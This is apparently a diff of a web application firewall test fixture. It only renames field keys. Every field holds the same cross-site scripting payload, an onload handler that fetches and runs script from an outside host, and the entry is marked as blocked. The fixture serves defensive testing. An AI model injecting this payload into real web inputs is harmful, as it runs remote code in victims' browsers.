@@ -3,12 +3,12 @@
     {
       "URL": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
       "ARGS": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
-      "Body": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
-      "Cookie": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
-      "UA": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
-      "Referer": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
-      "Headers": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
-      "Blocked": true
+      "BODY": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "COOKIE": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "USER-AGENT": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "REFERER": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "HEADER": "onload=x=>$.getScript('//brutelogic.com.br/2.js')",
+      "BLOCKED": true
     }
   ]
 }
